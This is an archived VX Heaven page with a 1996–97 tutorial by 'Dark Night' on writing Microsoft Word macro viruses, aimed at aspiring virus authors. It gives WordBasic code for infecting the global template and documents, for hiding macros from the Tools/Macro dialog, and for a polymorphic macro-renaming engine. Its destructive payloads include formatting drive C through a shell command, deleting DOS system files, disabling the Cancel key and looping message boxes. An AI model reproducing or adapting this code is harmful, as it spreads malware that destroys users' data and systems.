<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Dark Night 'The macro virus writing tutorial' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Dark Night"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Dark Night,macro virus writing tutorial, macrocopy, macro, macros, global, autoexec, filename, error, payload, time, format, legalese, goto, interested, copyright, info"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"0fb6bd82c296e208edcd0b74277367b2990cd01c-1498756716-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vdn01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>The macro virus writing tutorial</h1><p><a href="/lib/?lang=en&amp;author=Dark%20Night"> Dark Night</a><br/> <em> 1996</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vdn01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vdn01">Back to index</a>] [<a href="/lib/vdn01.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li>Part 1
<ul>
<li><a href="#p11">Legalese</a></li>
<li><a href="#p12">Introduction</a></li>
<li><a href="#p13">The tools</a></li>
<li><a href="#p14">The general stuff</a></li>
<li><a href="#p15">The SaveAs routine</a></li>
<li><a href="#p16">Special routines</a></li>
<li><a href="#p17">Your work</a></li>
<li><a href="#p18">Interested?</a></li>
</ul></li>
<li>Part2
<ul>
<li><a href="#p21">Legalese</a></li>
<li><a href="#p22">Intro to life</a></li>
<li><a href="#p23">Payload?? I'm lost!</a></li>
<li><a href="#p24">What is possible?</a></li>
<li><a href="#p25">Mean stuff</a></li>
<li><a href="#p26">Polymorphic??</a></li>
<li><a href="#p27">Where to?</a></li>
</ul></li>
</ul>
<h2><a name="p11">Legalese</a></h2>
<p>I shall not be held responsible for any damage created be direct or indirect use of the publicised material. This document is copyright 1996 to me, Dark Night of VBB. Herewith I grant anybody license to redistribute this document as long as it is kept in whole and my copyright notice is not removed. Also if I find any lamers who just take the code published here and say it is their own I will see that they'll be punished. (Believe it or not :-))!!!</p>
<h2><a name="p12">Introduction</a></h2>
<p>Many of you may be wondering right now who the hell I am and who VBB is. Come on lamers! Get alive. VBB is one of the coolest virus groups around. You can't tell me you've never heard of us. Well, Ok I'll admit it. We're not that popular yet, but that'll come. So for now here's my contribution to the group as the leader. Welcome to the macro virus writing tutorial part 1.</p>
<p>Enjoy!!</p>
<h2><a name="p13">The tools</a></h2>
<p>First of all you'll need MS Word 6.0 or up (duh), then you may want to get VBB's macro disassembler by Aurodreph so that you can study encrypted macros. Also you should make back-ups of your normal. DOT template in your WINWORD6\TEMPLATE\ directory, as this is the document commonly infected by macro virii. So whatch out. Also I recommend to have at least a small knowledge of word basic, so that you kind a know what's going on. Well, that's it. You've made it this far. It's now time to get into the macro virus generals.</p>
<h2><a name="p14">The general stuff</a></h2>
<p>Most macro virii have a pretty set structure. They start of with an auto-executing macro which infects the normal.dot(global) template. Then they have some macros which will infect the files on certain actions. For example FileSaveAs, FileSave, FileOpen, ToolsMacros. Documents are infected through transferring the macros into the document and having them execute the next time the document is opened. A code for the autoexec routine would look something like this:</p>
<pre class="source">
'ANYTHING AFTER THE ' ARE MY COMMENTS

Sub MAIN
On Error Goto Abort
iMacroCount = CountMacros(0, 0)
'CHECK TO SEE IF INFECTION EXISTS
For i = 1 To iMacroCount
If MacroName$(i, 0, 0) = "PayLoad" Then
bInstalled = - 1
'BY LOOKING FOT THE PAYLOAD MACRO
End If
If MacroName$(i, 0, 0) = "FileSaveAs" Then
bTooMuchTrouble = - 1
'BUT IF THE FILESAVEAS MACRO EXISTS THEN INFECTION IS
'TOO DIFICULT.
End If
Next i
If Not bInstalled And Not bTooMuchTrouble Then
'add FileSaveAs and copies of AutoExec and FileSaveAs.
'Payload has no use except to check for infection.
'The ,1 encrypts all macros in their destination making
'them unreadble in Word.
iWW6IInstance = Val(GetDocumentVar$("WW6Infector"))
sMe$ = FileName$()
Macro$ = sMe$ + ":PayLoad"
MacroCopy Macro$, "Global:PayLoad", 1
Macro$ = sMe$ + ":FileOpen"
MacroCopy Macro$, "Global:FileOpen", 1
Macro$ = sMe$ + ":FileSaveAs"
MacroCopy Macro$, "Global:FileSaveAs", 1
Macro$ = sMe$ + ":AutoExec"
MacroCopy Macro$, "Global:AutoExec", 1
SetProfileString "WW6I", Str$(iWW6IInstance + 1)
End If
Abort:
End Sub
</pre>
<h2><a name="p15">The SaveAs routine</a></h2>
<p>This is the routine which copies the macro virus into the active document when it is saved using File/Save As. It uses much of the same techniques as the AutoExec routine. Here's what the code should look like for the SaveAs routine:</p>
<pre class="source">
'YOU CAN ALWAYS USE THE ,1 AGAIN TO ENCRYPT MACROS.

Sub MAIN
Dim dlg As FileSaveAs
GetCurValues dlg
Dialog dlg
If (Dlg.Format = 0) Or (dlg.Format = 1) Then
MacroCopy "FileSaveAs", WindowName$() + ":FileSaveAs"
MacroCopy "FileSave ", WindowName$() + ":FileSave"
MacroCopy "PayLoad", WindowName$() + ":PayLoad"
MacroCopy "FileOpen", WindowName$() + ":FileOpen"
Dlg.Format = 1
End If
FileDaveAs dlg
End Sub
</pre>
<p>Short, but it works well. All this info, believe it or not, is enough to make a small and basic macro virus.</p>
<h2><a name="p16">Special routines</a></h2>
<p>There are several methods which can be used to hide your virus or make it more effective. For eample, you can make a macro to hide your virus when somebody looks in tools/macro. The code should look something like this:</p>
<pre class="source">
Sub MAIN
On Error Goto ErrorRoutine

OldName$ = NomFichier$()

If macros.bDebug Then
MsgBox "start ToolsMacro"
Dim dlg As OutilsMacro
If macros.bDebug Then MsgBox "1"
GetCurValues dlg
If macros.bDebug Then MsgBox "2"
On Error Goto Skip
Dialog dlg
OutilsMacro dlg
Skip:
On Error Goto ErrorRoutine
End If

REM enable automacros
DisableAutoMacros 0

macros.SavToGlobal(OldName$)
macros.objectiv
Goto Done

ErrorRoutine:
On Error Goto Done
If macros.bDebug Then
MsgBox "error " + Str$(Err) + " occurred"
End If

Done:
End Sub
</pre>
<p>Also you can include external subroutines. For example, the nuclear virus tries to compile and run an external file-infector virus. Or some macro trojans try to format your harddrive when you open a document. An example subroutine for an uncoditional format would be this:</p>
<pre class="source">
sCmd$ = "echo y|format c: /u"
Shell Environment$ ("COMSPEC") + "/c" + sCmd$, 0

ALSO YOU MAY WANT TO PUT A PASSWORD ONTO THE DOCUMENT THAT YOU'VE JUST
INFECTED OR WHEN YOU HAVE EXPERIENCED AN ERROR WHILE INFECTING AND THE
CURRENT SECOND IS 13. TAKE A LOOK AT THIS EXAMPLE:

Sub MAIN
On Error Goto ByeBye

.
. 'Infection code
.
.
.
\/

ByeBye:
If (second(Now()) = 13) Then
Dlg.Password = "Dark_Night" 'SETS PASSWORD TO DARK_NIGHT. YOU CAN
'ALSO SET A RANDOM PASSWORD CODE SHALL
'PRESENTED IN NEXT INSTALLMENT! :-D
</pre>
<h2><a name="p17">Your work</a></h2>
<p>I have explained the basic knowledge you need to have to start writing your macro virus. If anybody responds to this tutorial, then I will go into more details about the different structures and possibilities of macro virii.</p>
<h2><a name="p18">Interested?</a></h2>
<p>I have no idea if anybody would be interested if I continue this titorial. So to not make myself do all the work for nothing, I request that you please drop me an e-mail if you would be interested in any further explanation of macro virii. I will then gladly continue this tutorial of macro virii for you. My address is:</p>
<p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cf8baebda49081a6a8a7bb8fa6a3a9e1a1aabb">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></p>
<p>Dark Night</p>
<h2>Part 2</h2>
<h2><a name="p21">Legalese</a></h2>
<p>I shall not be held responsible for any damage created be direct or indirect use of the publicised material. This document is copyright 1997 to me, Dark Night of VBB. Herewith I grant anybody license to redistribute this document as long as it is kept in whole and my copyright notice is not removed. Also if I find any lamers who just take the code published here and say it is their own I will see that they'll be punished. (Sure.....Sure :-))!!!</p>
<h2><a name="p22">Intro to life</a></h2>
<p>Yep, it's time again for another tutorial! I got so much positive feedback(and these people wouldn't leave me alone)so I decided to continue. This time I will mostly be talking about virus payloads as I presented the infection routines to you last time.... Oh yeah! The question about books on Word BAsic reached me a lot of times too! Here's a book I've been told is supposed to be good: "BEGINNING WORDBASIC PROGRAMMING", ISBN: #1874416869. Enjoy!</p>
<h2><a name="p23">Payload?? I'm lost!</a></h2>
<p>Why are you reading this then? The Payload is the bomb....The thing that does stuff besides infecting....</p>
<h2><a name="p24">What is possible?</a></h2>
<p>Well, there are a lot of things you can do... You can format harddrives, Crash word, Run other proggies(dos virii) etc. But, you don't want your virus to this every single time it is run right? So you need a check routine:</p>
<pre class="source">
If Month(Now()) = 1 And Day(Now()) = 3 Then 'Easy right?
BOMB HERE

ELSE
'whatever

End IF
</pre>
<p>The easiest method to annoy a user is to send the following very frequently:</p>
<pre class="source">
SendKeys "%"+"{F4}"
</pre>
<p>This has the effect of pressing alt+f4...The problem is that word still prompts to save. Since we are in the annoying stuff right now, there is another one:</p>
<pre class="source">
Again:
MsgBox"HAHAHAHAHA!"
Goto Again
</pre>
<p>Mean isn't it....Imagine someone working and this thing popping up one day when he opens your word document. Since his template was infected, he will see this more often :)</p>
<h2><a name="p25">Mean stuff</a></h2>
<p>Ok, you can get a good kick out of the above, but what if you really want to get someone? Yes, you guessed it... There's even meaner stuff :)</p>
<pre class="source">
ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = "Cancel", .Remove, .Context = 0
'The above macro looks handy for the close all function :) (To all who don't understand: It
'removes the cancel button!)

Kill"C:\Autoexec.bat"
Kill"C:\Config.sys"
Kill"C:\Command.com"
Kill"C:\io.sys"
Kill"C:\msdos.sys"
Finish:
</pre>
<p>Ain't this mean :) I got the next one from the Nightmare Joker. Enjoy....</p>
<pre class="source">
ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = "Cancel", .Remove, .Context = 0

SendKeys "^" + "%" + "-"
</pre>
<p>Close all documents and look under File....How's your Cursor doin'?</p>
<h2><a name="p26">Polymorphic??</a></h2>
<p>Yes, it is possible.... Here's a polymorphic engine which uses random names for its macros to hide is indentity. This code is from The Nightmare Joker! I translated it into English:</p>
<pre class="source">
Sub MAIN
On Error Goto Done

A$ = FileName$()
If A$ = "" Then Goto Finish

If VInstalled = 0 Then
Run1
Run2
FileSaveAll 1, 1
Else
Goto Done
End If

Done:
A$ = FileName$()
If A$ = "" Then
Goto Finish
Else
Insert " "
End If

Finish:
MsgBox "polymorph", - 8
End Sub

Sub Run1
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R1$ = GetDocumentVar$("VirNameDoc")
CO$ = FileName$() + ":" + R1$
MacroCopy CO$, "Global:" + Z$
SetProfileString "Intl", "Info2", Z$
ToolsCustomizeKeyboard .KeyCode = 65, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub

Sub Run2
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R2$ = GetDocumentVar$("VirName")
OC$ = FileName$() + ":" + R2$
MacroCopy OC$, "Global:" + Z$
SetProfileString "Intl", "Info1", Z$
ToolsCustomizeKeyboard .KeyCode = 32, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub

Function VInstalled
CC$ = GetProfileString$("Intl", "Info1")
VInstalled = 0
If CountMacros(0) > 0 Then
For i = 1 To CountMacros(0)
If MacroName$(i, 0) = CC$ Then
VInstalled = 1
End If
Next i
End If
End Function

Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
Num = Int(Rnd() * (Two - One) + One)
A$ = Str$(Num)
A$ = LTrim$(A$)

B$ = Mid$(A$, 1, 1)
C$ = Mid$(A$, 2, 1)
D$ = Mid$(A$, 3, 1)
E$ = Mid$(A$, 4, 1)

If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"

If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
</pre>
<p>I'm going to leave you withou explination at this point because if you have no idea what this is about, then this is nothing for you as a beginner!</p>
<h2><a name="p27">Where to?</a></h2>
<p>I don't know when I will continue this, but I'm sure that if there are any news that I will gladly continue. As usual you can reach me at <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f8bc998a93a7b6919f908cb891949ed6969d8c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> with any questions! Also I would appreciate any future topic suggestions!</p>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vdn01">Back to index</a>] [<a href="/lib/vdn01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vdn01">de</a><a href="/lib/index.php?lang=en&amp;id=vdn01">en</a><a href="/lib/index.php?lang=es&amp;id=vdn01">es</a><a href="/lib/index.php?lang=it&amp;id=vdn01">it</a><a href="/lib/index.php?lang=fr&amp;id=vdn01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vdn01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vdn01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vdn01">ua</a></div>
</body>
</html>
